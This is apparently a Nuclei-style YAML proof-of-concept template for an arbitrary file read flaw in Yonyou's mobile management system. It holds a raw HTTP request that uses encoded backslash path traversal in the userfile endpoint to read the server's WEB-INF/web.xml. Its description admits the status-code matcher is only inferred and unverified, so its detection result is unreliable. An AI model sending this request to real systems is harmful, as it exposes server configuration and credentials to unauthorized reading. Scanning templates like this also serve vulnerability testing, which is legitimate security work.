id: poc-0c8bd97daabd62a64eb1
info:
  name: 用友移动管理系统userfile存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /mobsm/common/userfile?path=%5C..%5Cwebapps%5Cnc_web%5CWEB-INF%5Cweb.xml HTTP/1.1

    User-Agent: Java/1.8.0_391

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
